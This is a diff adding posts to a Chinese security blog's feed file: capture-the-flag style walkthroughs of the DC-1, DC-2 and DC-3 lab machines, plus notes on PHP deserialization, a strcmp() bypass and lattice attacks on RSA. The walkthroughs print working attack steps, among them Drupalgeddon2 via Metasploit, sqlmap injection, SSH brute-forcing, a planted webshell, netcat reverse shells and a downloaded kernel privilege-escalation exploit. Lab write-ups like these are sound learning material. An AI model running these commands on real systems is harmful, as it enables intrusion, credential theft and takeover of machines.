@@ -4,6 +4,181 @@
   
   
   <entry>
+    <title>DC-1</title>
+    <link href="/2021/05/28/DC-1/"/>
+    <url>/2021/05/28/DC-1/</url>
+    
+    <content type="html"><![CDATA[<h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -sP 192.168.93.0/24#扫描局域网内的ip确定主机<br>nmap -sV 192.168.93.79#扫描靶机开方的端口<br></code></pre></td></tr></table></figure><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210501205243182.png" alt="image-20210501205243182" style="zoom:150%;" /><p>发现开放三个端口，我们先访问80端口。</p><p>看到了Drupal,启动msfconsole,并寻找相关攻击模块。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfconsole<br>search Drupal<br></code></pre></td></tr></table></figure><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210501210326675.png" alt="image-20210501210326675" style="zoom:67%;" /><p>选择最新的模块进行攻击。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">use exploit/unix/webapp/drupal_drupalgeddon2<br>set RHOST 192.168.93.79<br>run<br></code></pre></td></tr></table></figure><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210501210651791.png" alt="image-20210501210651791"></p><p>拿到meterpreter会话,列出当前文件，发现flag1.txt。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">ls<br>cat flag1.txt<br></code></pre></td></tr></table></figure><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210501211042144.png" alt="image-20210501211042144" style="zoom:150%;" /><p>根据该提示，我们去查询相关配置文件，Drupal的配置文件存于 ./sites/default/settings.php</p><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210501211638214.png" alt="image-20210501211638214"></p><p>拿到flag2，同时发现数据库账号和密码。</p><p>输入shell切换壳。</p><p>登陆数据库发现没有回显，可能是因为不是交互式shell。</p><p>利用python触发交互示shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p>登陆数据库。</p><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210501212835144.png" alt="image-20210501212835144"></p><p>进入数据库drupaldb,查表，进入users,再把东西都列出来，发现admin和其密码。</p><p>修改admin密码:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">php scripts/password-hash.sh 123456#返回shell输入<br></code></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">update users set pass&#x3D;&quot;$S$D0EhkXn49TFszpwkBNaPbktisjrdSzUqOwL3pbTcUZ5YfsCyd4Q0&quot; where uid&#x3D;1;#mysql登陆数据库后使用<br></code></pre></td></tr></table></figure><p>修改后登陆网站，找到flag3</p><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210501221735813.png" alt="image-20210501221735813"></p><p>根据提示返回终端，查找相关文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /etc/passwd<br></code></pre></td></tr></table></figure><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210501222739893.png" alt="image-20210501222739893"></p><p>这里的flag应该是一个用户，之前扫描端口有一个ssh服务的端口，猜测用该需要用ssh登陆该用户，但不知道密码，所有需要爆破。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hydra -l flag4 -P /usr/share/john/password.lst 192.168.78.147 ssh -vV -f<br></code></pre></td></tr></table></figure><p>得到密码为orange，进行ssh连接。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh flag4@192.168.93.79<br></code></pre></td></tr></table></figure><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210501223520505.png" alt="image-20210501223520505" style="zoom:150%;" /><p>根据提示得知flag可能在root目录下，但尝试进入失败。</p><p>查看当前用户</p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210501223759447.png" alt="image-20210501223759447" style="zoom: 200%;" /><p>想办法提升为root。</p><p>这里使用SUID提权。</p><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210501224206065.png" alt="image-20210501224206065"></p><p>成功提升为root用户。</p><p>最后找到flag。</p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210501224354960.png" alt="image-20210501224354960" style="zoom:150%;" />]]></content>
+    
+    
+    <categories>
+      
+      <category>redteam</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>-web -DC</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>基于格的通用私钥攻击</title>
+    <link href="/2021/05/28/%E5%9F%BA%E4%BA%8E%E6%A0%BC%E7%9A%84%E9%80%9A%E7%94%A8%E7%A7%81%E9%92%A5%E6%94%BB%E5%87%BB%EF%BC%88RSA%E7%94%A8%E4%BA%86%E5%90%8C%E4%B8%80%E4%B8%AAd%EF%BC%89/"/>
+    <url>/2021/05/28/%E5%9F%BA%E4%BA%8E%E6%A0%BC%E7%9A%84%E9%80%9A%E7%94%A8%E7%A7%81%E9%92%A5%E6%94%BB%E5%87%BB%EF%BC%88RSA%E7%94%A8%E4%BA%86%E5%90%8C%E4%B8%80%E4%B8%AAd%EF%BC%89/</url>
+    
+    <content type="html"><![CDATA[<h1 id="基于格的通用私钥攻击（RSA用了同一个d）"><a href="#基于格的通用私钥攻击（RSA用了同一个d）" class="headerlink" title="基于格的通用私钥攻击（RSA用了同一个d）"></a>基于格的通用私钥攻击（RSA用了同一个d）</h1><p>假设现在有r组n,e，他们的私钥均为d，则有：</p><p><strong>e<sub>1</sub>*d = k<sub>1</sub>*phi(N<sub>1</sub>) + 1</strong> </p><p><strong>e<sub>2</sub>*d = k<sub>2</sub>*phi(N<sub>2</sub>) + 1</strong></p><p>​     <strong>. . .</strong></p><p>*<em>e<sub>r</sub><em>d = k<sub>r</sub>*phi(N<sub>3</sub>) + 1</em></em></p><p>此处默认（N<sub>1</sub> &lt; N<sub>2</sub> &lt; … &lt; N<sub>r</sub> &lt; 2N<sub>r</sub> ）</p><p>令 M = [N<sub>r</sub><sup>1/2</sup> ]</p><p> phi(N<sub>r</sub> )= N<sub>i</sub> - s<sub>i</sub> 且k<sub>i</sub> &lt; d (i = 1,2,…,r)</p><p>则有：e<sub>i</sub>*d - N<sub>i</sub>*k<sub>i</sub> = 1 - k<sub>i</sub>*s<sub>i</sub>  </p><p>可以列出下列等式：</p><p>​            <strong>dM = dM</strong></p><p><strong>e<sub>1</sub>*d - N<sub>1</sub>*k<sub>1</sub> = 1 - k<sub>1</sub>*s<sub>1</sub></strong></p><p><strong>e<sub>2</sub>*d - N<sub>2</sub>*k<sub>2</sub> = 1 - k<sub>2</sub>*s<sub>2</sub></strong></p><p>​    <strong>. . .</strong></p><p><strong>e<sub>r</sub>*d - N<sub>r</sub>*k<sub>r</sub> = 1 - k<sub>r</sub>*s<sub>r</sub></strong></p><p>可以构造<br>$$<br>x_r*B_r = v_r\<br>x_r = (d,k_1,k_2,…,k_r)<br>$$</p><p>$$<br>B_r =<br>\begin{bmatrix}<br>{M}&amp;{e_1}&amp;{\cdots}&amp;{e_r}\<br>{0}&amp;{-N_1}&amp;{\cdots}&amp;{0}\<br>{\vdots}&amp;{\vdots}&amp;{\ddots}&amp;{\vdots}\<br>{0}&amp;{0}&amp;{\cdots}&amp;{-N_r}\<br>\end{bmatrix}\<br>vr = (dM,1-k_1<em>s_1,…,1-k_r</em>s_r)<br>$$<br>而后对B<SUB>r</SUB> 使用LLL算法得到向量b,最后<br>$$<br>d = \frac{|b|}{M}<br>$$</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>knowledge-crypto</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>-Crypto -RSA</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>PHP反序列化</title>
+    <link href="/2021/05/28/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+    <url>/2021/05/28/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    
+    <content type="html"><![CDATA[<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><p>为了能够跨平台存贮，有时候我们会将对象的信息转化为可以存储或传输的形式，这就是序列化（比如json），相应的，我们把数据恢复回来，就叫反序列化。</p><p><strong>php相关函数：</strong></p><p>serialize() 返回一个包含字节流的字符串，序列化对象返回的字符串似乎与其打印出的字符串有所不同。（可能有部分内容没有显示，似乎是两个字符的差异，所以修改时建议使用str_replace()）</p><p>unserialize() 重新把字符串恢复成原来的值【相当于反序列化】</p><p><em>ps:序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。为了能够<a href="https://www.php.net/manual/zh/function.unserialize.php">unserialize()</a>一个对象，这个对象的类必须已经定义过。如果序列化类A的一个对象，将会返回一个跟类A相关，而且包含了对象所有变量值的字符串。 如果要想在另外一个文件中反序列化一个对象，这个对象的类必须在反序列化之前定义，可以通过包含一个定义该类的文件或使用函数<a href="https://www.php.net/manual/zh/function.spl-autoload-register.php">spl_autoload_register()</a>来实现</em>。</p><p>__wakeup()绕过：</p><p>（PHP5&lt;5.625&amp;&amp;PHP7&lt;7.0.10）</p><p><code>__wakeup</code>触发于<code>unserilize()</code>调用之前，但是如果被反序列化的对象的个数小于指定个数时，虽然会反序列化但不会触发<code>__wakeup</code>。</p><p>private修饰变量的序列化的类名和字段名前面要加空，可用%00修饰</p><p>protected修饰变量的序列化的字段名前要加%00*%00</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>web</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>-web -PHP</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>php strcmp()函数漏洞</title>
+    <link href="/2021/05/28/php%20strcmp()%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/"/>
+    <url>/2021/05/28/php%20strcmp()%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/</url>
+    
+    <content type="html"><![CDATA[<h1 id="php-strcmp-函数漏洞"><a href="#php-strcmp-函数漏洞" class="headerlink" title="php strcmp()函数漏洞"></a>php strcmp()函数漏洞</h1><p><em>php&lt;5.3</em></p><p>strcmp()接受两个string类型,但如果接受了错误的类型，函数会发生错误，但是在5.3之前的php中，显示了报错的警告信息后，函数将return 0，也就是虽然报了错，但却判定其相等。</p><p>绕过该函数时使其接受对象为数组或对象。</p><p>我们在post数据时，php为了可以上传一个数组，会把结尾带一对中括号的变量</p><p>如a[]=123,此处其实上传了一个数组。【服务器端代码应有$_POST[‘a’]】</p><p>而strcmp()中若直接或间接接受了这个post上去的a，我们就绕过了他（直接判定相等。）</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>web</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>-web -PHP</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>DC-3</title>
+    <link href="/2021/05/28/DC-3/"/>
+    <url>/2021/05/28/DC-3/</url>
+    
+    <content type="html"><![CDATA[<h1 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h1><p>nmap扫出靶机及其端口，框架，而后在浏览器上访问。</p><p>提示只有一个flag，且需要root权限。</p><p>框架为joomla，在msfconsole上找到对应模块逐一尝试，没能成功，但成功找到了对应版本号3.7.0</p><p>在网络上继续搜索相应漏洞，发现该版本有对应的sql注入漏洞，回到浏览器进行尝试，而后注入得到数据库名。</p><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210503175057935.png" alt="image-20210503175057935"> </p><p>再次使用joomscan工具进行扫描</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">perl joomscan.pl --url http://192.168.101.23<br></code></pre></td></tr></table></figure><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210503183623742.png" alt="image-20210503183623742"></p><p>发现一些页面。</p><p>寻找对应版本的模块。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">searchsploit joomla 3.7<br>cat /usr/share/exploitdb/exploits/php/webapps/42033.txt<br></code></pre></td></tr></table></figure><p>复制sql注入命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sqlmap -u &quot;http://192.168.101.23/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]#查询数据库<br>sqlmap -u &quot;http://192.168.101.23/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --current-db -p list[fullordering]#查询表名<br>sqlmap -u &quot;http://192.168.101.23/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns  -p list[fullordering]#查询表中所有列<br></code></pre></td></tr></table></figure><p>查询到用户为admin，密码为一串hash值，那么对hash值进行爆破</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim hashpassword.txt#将hash值写入该文件<br>john hashpassword.txt#爆破hash值<br></code></pre></td></tr></table></figure><p>而后获得密码snoopy，进行登录，并找到模板相关的页面，发现可以创建文件，直接给他来个一句话木马。</p><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210503234340411.png" alt="image-20210503234340411"></p><p>那么我们现在需要的就是找到shell.php的位置并进行连接。</p><p>之前使用joomscan扫出的目录里有templates，前面的administrator应该只是登陆页面，所以猜测真正的文件路径是<a href="http://192.168.101.23/templates/beez3/html/shell.php">http://192.168.101.23/templates/beez3/html/shell.php</a> (beez3的猜测是因为进入文件夹的时候经过了)。</p><p>蚁剑连接，但蚁剑的连接只是单向shell，我们需要进行交互式的shell，这样才能提到root权限。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc lvvp 1234#kali本机开启监听<br>nc -e /bin/bash 192.168.101.16 1234#靶机连接kali<br>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.101.16 4444 &gt;/tmp/f#靶机输入，反弹shell完成。<br></code></pre></td></tr></table></figure><p>尝试SUID提权和git提权，但都失败了，之前登陆的网站中，有关于网站使用系统的信息，其中Ubuntu的版本是16.04</p><p>可以试着找找该版本的漏洞</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">searchsploit Ubuntu 16.04<br></code></pre></td></tr></table></figure><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210504001644530.png" alt="image-20210504001644530"></p><p>这里选择39772进行提权，(该文件说明时提到了可以用于获得root权限)s。</p><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210504002150716.png" alt="image-20210504002150716"></p><p>下载payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip<br>cp 39772.zip /var/www/html<br>service apache2 start<br></code></pre></td></tr></table></figure><p>而后靶机就可以从kali这下载了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget http://192.168.101.16/39772.zip<br>unzip 39772.zip<br>cd 39772<br>tar -xvf exploit.tar<br></code></pre></td></tr></table></figure><p>再从主机进行操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd 39772<br>cd ebpf_mapfd_doubleput_exploit<br>./compile.sh<br>./doubleput#到这里已经获得了root权限<br>cd /root<br>cat the-flag.txt<br></code></pre></td></tr></table></figure><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210504010206993.png" alt="image-20210504010206993"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>redteam</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>-web -DC</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>DC-2</title>
+    <link href="/2021/05/28/DC-2/"/>
+    <url>/2021/05/28/DC-2/</url>
+    
+    <content type="html"><![CDATA[<h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><p>先扫描当前网段下的ip确定靶机。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -sP 192.168.93.0/24<br></code></pre></td></tr></table></figure><p>扫描靶机开放的端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -sV 192.168.93.152<br></code></pre></td></tr></table></figure><p>发现开放80端口，用浏览器进行访问</p><p>发现ip地址被直接转成了dc-2，而且无法访问，页面显示无法解析出ip地址</p><p>进入kali下的/etc/hosts,在末尾加上192.168.93.152 dc-2即可。</p><p>再次访问页面，可以正常访问。</p><p>拿到flag1</p><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210501230235415.png" alt="image-20210501230235415"></p><p>这里再次用nmap进行扫描</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -sS -Pn -A -p 1-65535 192.168.239.152<br></code></pre></td></tr></table></figure><p>发现还扫出来一个7744端口，运行了ssh服务。</p><p>flag1提示cewl，同时wordpress也是一种框架，可以寻找相关工具。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wpscan --url http://dc-2 --enumerate u#扫描关于wordpress的相关漏洞<br></code></pre></td></tr></table></figure><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210502210311471.png" alt="image-20210502210311471"></p><p>发现了三个用户。</p><p>但并不知道密码，这里查询cewl用法，使用cewl生成密码。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cewl -w 555.txt http://dc-2<br></code></pre></td></tr></table></figure><p>再将用户写入txt文件，开始准备爆破ssh用户。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">hydra -L 444.txt -P 555.txt ssh://192.168.239.152 -s 7744 -vV指定7744端口ssh爆破用户名和密码。<br>wpscan --url http://dc-2/ -e u -U 444.txt -P 555.txt #这个也能爆。<br></code></pre></td></tr></table></figure><p>登陆tom用户：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh tom@192.168.239.152 -p 7744<br></code></pre></td></tr></table></figure><p>发现是rbash，部分命令受限，绕过rbash</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">BASH_CMDS[a]=/bin/sh;a<br>export PATH=$PATH:/bin/<br>export PATH=$PATH:/usr/bin<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">ls<br>cat flag3.txt<br></code></pre></td></tr></table></figure><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210502223740131.png" alt="image-20210502223740131"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">su jerry<br>cd /home/jerry<br>ls<br>cat flag4.txt<br></code></pre></td></tr></table></figure><p>根据提示联想git提权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l#查看sudo配置文件<br>sudo git help config#git提权<br>cd /root<br>ls<br>cat final-flag.txt<br></code></pre></td></tr></table></figure><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210502231015330.png" alt="image-20210502231015330"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>redteam</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>-web -DC</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>格相关</title>
+    <link href="/2021/05/16/%E6%A0%BC%E7%9B%B8%E5%85%B3/"/>
+    <url>/2021/05/16/%E6%A0%BC%E7%9B%B8%E5%85%B3/</url>
+    
+    <content type="html"><![CDATA[<h1 id="格相关"><a href="#格相关" class="headerlink" title="格相关"></a>格相关</h1><h2 id="格的定义"><a href="#格的定义" class="headerlink" title="格的定义"></a>格的定义</h2><p>$$<br>{设线性无关向量组v_1,v_2,…,v_n \in R^m，该组向量生成的格L即是该组向量的线性组合的集合，\<br>且其系数a_1,a_2,…,a_n\in Z^n,即;L = {a_1v_1+a_2v_2+…+a_nv_n,a_n\in Z}}<br>$$</p><h3 id="与格相关的计算性问题"><a href="#与格相关的计算性问题" class="headerlink" title="与格相关的计算性问题"></a>与格相关的计算性问题</h3><p>$$<br>{;;;1.SVP(最短向量问题)：在格L中寻找一个最短的非零向量，即寻找一个非零向量v\in L使得其范数||v||最小。<br>}<br>\<br>{2.CVP(在格中寻找与指定非格向量最为接近的向量)：对于一个不在格中的向量w,寻找一个向量v\in L使得\<br>||w-v||最小}<br>$$</p><h2 id="LLL算法"><a href="#LLL算法" class="headerlink" title="LLL算法"></a>LLL算法</h2><p>可以求解SVP问题<br>$$<br>输入一组格的基b_1,b_2,…,b_n \in Z^n进行下列计算\<br>{for;i=2;to;n;do}\<br>\qquad\qquad for;j=i-1;to;do\<br>\qquad\qquad\qquad\qquad\qquad\qquad\qquad<br>b_i = b_i-c_i,_jb_j ;（c_i,_j=[\frac{\langle b_i,b^*_j\rangle}{\langle b^*_j,b^*_j\rangle}]）\<br>{而后进行比对，如果;\delta ||b^*_i||&gt;||\mu _{i+1},<em>ib^*<em>i+b^*</em>{i+1}||\<br>则交换b_i和b</em>{i+1}的值，并回到第一步。\<br>最后输出b_1,b_2,…,b_n。}<br>$$<br>我的理解就是先对这组基做一个施密特正交化，并记下正交化时向量前的系数，而后对输入的基做一个变幻，从第二个开始每个向量减去前面所有的向量与其对应‘系数’的乘积的和，再看看是否满足所需条件。满足就进行交换而后回到开始再来一遍。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>knowledge-crypto</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>-Crypto -Lattice</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>ECC</title>
     <link href="/2021/03/31/ECC/"/>
     <url>/2021/03/31/ECC/</url>
